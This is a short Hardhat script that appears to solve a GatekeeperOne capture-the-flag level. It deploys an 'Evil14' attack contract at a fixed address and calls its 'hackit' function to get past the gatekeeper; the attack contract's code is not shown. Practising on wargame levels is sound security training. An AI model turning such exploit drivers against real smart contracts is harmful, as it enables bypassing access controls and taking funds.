import { ethers } from "hardhat";
import { Evil14__factory, GatekeeperOne__factory } from "../typechain-types";
import { Evil__factory } from "../typechain-types/factories/levels/L10__king/Evil10.sol";

async function main() {
  // Make it past the gatekeeper and register as an entrant to pass this level.

  let tx; // will have to wait for each tx

  let [deployer] = await ethers.getSigners();
  let contract = "0xCEC401f6f27e7D834C61ee01bFBCa8314CBc5050";

  let gatekeeper = new GatekeeperOne__factory(deployer).attach(contract);

  let evil = await new Evil14__factory(deployer).deploy(contract);

  tx = await evil.hackit({ gasLimit: 30_000_000 }); // max gas limit
  await tx.wait();

  console.log(await gatekeeper.entrant());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
